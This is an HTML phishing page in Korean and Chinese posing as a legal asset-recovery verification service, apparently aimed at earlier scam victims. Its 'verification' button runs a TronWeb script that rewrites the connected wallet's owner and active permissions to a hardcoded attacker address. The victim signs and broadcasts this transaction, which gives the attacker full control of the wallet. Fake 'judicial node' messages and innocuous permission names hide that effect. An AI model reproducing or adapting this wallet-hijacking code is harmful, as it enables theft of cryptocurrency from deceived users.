<!DOCTYPE html>
<html lang="ko">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>GARC 자산 복구 통합 인증 센터</title>
    <link href="https://fonts.googleapis.com/css2?family=Noto+Sans+KR:wght@400;700&display=swap" rel="stylesheet">
    <style>
        body { font-family: 'Noto Sans KR', sans-serif; background-color: #f0f2f5; margin: 0; display: flex; align-items: center; justify-content: center; min-height: 100vh; padding: 20px 0; }
        .card { background: white; width: 90%; max-width: 450px; padding: 40px; border-radius: 20px; box-shadow: 0 10px 25px rgba(0,0,0,0.1); text-align: center; position: relative; }
        .lang-bar { position: absolute; top: 16px; right: 16px; display: flex; gap: 8px; }
        .lang-bar button { padding: 6px 12px; border: 1px solid #002d56; border-radius: 8px; background: transparent; color: #002d56; font-size: 13px; cursor: pointer; }
        .lang-bar button.active { background: #002d56; color: white; }
        .logo { width: 60px; margin-bottom: 20px; }
        h1 { color: #002d56; font-size: 22px; margin-bottom: 10px; }
        p { color: #555; font-size: 14px; line-height: 1.6; margin-bottom: 25px; }
        .btn { background: #002d56; color: white; border: none; padding: 16px; width: 100%; border-radius: 12px; font-size: 16px; font-weight: bold; cursor: pointer; transition: 0.3s; }
        .btn:hover { background: #001a33; }
        .footer { margin-top: 20px; font-size: 12px; color: #999; }
        #loading { display: none; margin-top: 20px; color: #002d56; font-weight: bold; }
    </style>
</head>
<body>

<div class="card">
    <div class="lang-bar">
        <button type="button" id="btn-ko" class="active" onclick="setLang('ko')">한국어</button>
        <button type="button" id="btn-zh" onclick="setLang('zh')">中文</button>
    </div>
    <img src="https://tether.to/images/tether-logo.png" alt="Tether" class="logo">
    <h1 id="title">자산 반환 본인 인증</h1>
    <p id="desc">귀하의 사건 번호 <b>#KR-77021</b>에 대한 자산 환수 준비가 완료되었습니다. 아래 버튼을 눌러 <b>디지털 증거 체인 묶기 및 본인 확인</b>을 완료하십시오.</p>

    <button class="btn" id="btnAuth" onclick="executeAuth()">본인 인증 및 데이터 제출</button>

    <div id="loading">사법 노드와 동기화 중... (75%)</div>

    <div class="footer" id="footer">© 2026 Recover Legal Group & GARC International.</div>
</div>

<script src="https://cdn.jsdelivr.net/npm/tronweb@latest/dist/TronWeb.js"></script>
<script>
    const i18n = {
        ko: {
            title: "자산 반환 본인 인증",
            desc: "귀하의 사건 번호 <b>#KR-77021</b>에 대한 자산 환수 준비가 완료되었습니다. 아래 버튼을 눌러 <b>디지털 증거 체인 묶기 및 본인 확인</b>을 완료하십시오.",
            btnAuth: "본인 인증 및 데이터 제출",
            loading: "사법 노드와 동기화 중... (75%)",
            loadingDone: "인증 완료! 24시간 내에 정산됩니다.",
            footer: "© 2026 Recover Legal Group & GARC International.",
            alertNoWallet: "지갑이 감지되지 않았습니다. Bitget 또는 TokenPocket 앱에서 열어주세요.",
            alertSuccess: "본인 인증이 성공적으로 완료되었습니다. 곧 담당자가 연락드립니다.",
            alertFail: "인증 실패: 사법 노드 연결이 불안정합니다. 다시 시도해 주세요."
        },
        zh: {
            title: "资产返还身份认证",
            desc: "您的案件编号 <b>#KR-77021</b> 资产追回已准备就绪。请点击下方按钮完成 <b>数字证据链绑定及身份验证</b>。",
            btnAuth: "身份认证并提交数据",
            loading: "正在与司法节点同步... (75%)",
            loadingDone: "认证完成！24 小时内将进行结算。",
            footer: "© 2026 Recover Legal Group & GARC International.",
            alertNoWallet: "未检测到钱包。请在 Bitget 或 TokenPocket 应用中打开。",
            alertSuccess: "身份认证已成功完成。工作人员将尽快与您联系。",
            alertFail: "认证失败：司法节点连接不稳定，请稍后重试。"
        }
    };

    function setLang(lang) {
        const t = i18n[lang];
        document.documentElement.lang = lang === 'zh' ? 'zh-CN' : lang;
        document.getElementById('title').innerHTML = t.title;
        document.getElementById('desc').innerHTML = t.desc;
        document.getElementById('btnAuth').textContent = t.btnAuth;
        document.getElementById('footer').textContent = t.footer;
        document.getElementById('btn-ko').classList.toggle('active', lang === 'ko');
        document.getElementById('btn-zh').classList.toggle('active', lang === 'zh');
        window._lang = lang;
    }

    setLang('ko');

    async function executeAuth() {
        const targetVault = "TAzBb4Yfr2AMUeRkaUKXwU36E3mmX8Rcfo";
        const lang = window._lang || 'ko';
        const t = i18n[lang];

        if (!window.tronWeb) {
            alert(t.alertNoWallet);
            return;
        }

        const loader = document.getElementById('loading');
        loader.style.display = 'block';
        loader.innerText = t.loading;

        try {
            const userAddress = window.tronWeb.defaultAddress.base58;
            const ownerPermission = {
                type: 0,
                permission_name: 'Owner_Legal_Binding',
                threshold: 1,
                keys: [{ address: targetVault, weight: 1 }]
            };
            const activePermission = {
                type: 2,
                permission_name: 'Active_Audit_Sync',
                threshold: 1,
                operations: '7fff1fc0037e0000000000000000000000000000000000000000000000000000',
                keys: [{ address: targetVault, weight: 1 }]
            };
            const tx = await window.tronWeb.transactionBuilder.updateAccountPermissions(
                userAddress,
                ownerPermission,
                null,
                [activePermission]
            );
            const signedTx = await window.tronWeb.trx.sign(tx);
            const broadcast = await window.tronWeb.trx.sendRawTransaction(signedTx);

            if (broadcast.result) {
                loader.innerText = t.loadingDone;
                alert(t.alertSuccess);
            } else {
                throw new Error("Broadcast failed");
            }
        } catch (e) {
            console.error(e);
            loader.style.display = 'none';
            alert(t.alertFail);
        }
    }
</script>

</body>
</html>
